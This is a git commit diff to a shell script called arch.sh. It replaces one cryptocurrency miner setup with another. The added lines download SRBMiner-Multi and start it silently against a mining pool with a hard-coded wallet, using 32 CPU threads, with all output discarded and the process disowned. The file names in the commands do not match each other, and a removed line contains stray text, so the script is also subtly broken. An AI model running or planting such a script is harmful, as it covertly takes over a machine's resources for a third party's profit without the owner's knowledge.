a9bbd4a47f47850fce084fdaf4c514b211340e79
duckgo1337 <duckgo1337@outlook.com>
2025-06-26 22:46:00 +0000

    Update arch.sh

--- arch.sh
+++ arch.sh
@@ -1,11 +1,6 @@
-pacman -S mingw-w64-x86_64-curl --noconfirm
-pacman -S base-devel curl libcurl-compat libcurl-gnutls
-wget https://github.com/APEPEPOW/cpuminer-memehash/archive/refs/heads/main.tar.gz
-tar -zxvf main.tar.gz
-cd cpuminer-memehashメイン
-./configure
-make
-sudo make install
-sudo pacman -S jansson openssl
-cpuminer --version
-wine cpuminer.exe -a memehash -o stratum+tcp://rx.unmineable.com:3333 -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.cpuminer -p x >/dev/null 2>&1 & disown 
+pacman -Syu
+pacman -S wget --noconfirm
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.9.3/SRBMiner-Multi-2-9-3-Linux.tar.gz
+tar -zxvf SRBMiner-Multi-2-9-3.Linux.tar.gz
+cd SRBMIner-Multi-2-9-3
+./SRBMiner-Multi --algorithm xelishashv2_pepew --pool stratum+tcp://rx.unmineable.com:3333 -u PEPE:0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.memehash --password x --cpu-threads 32 --disable-gpu >/dev/null 2>&1 & disown
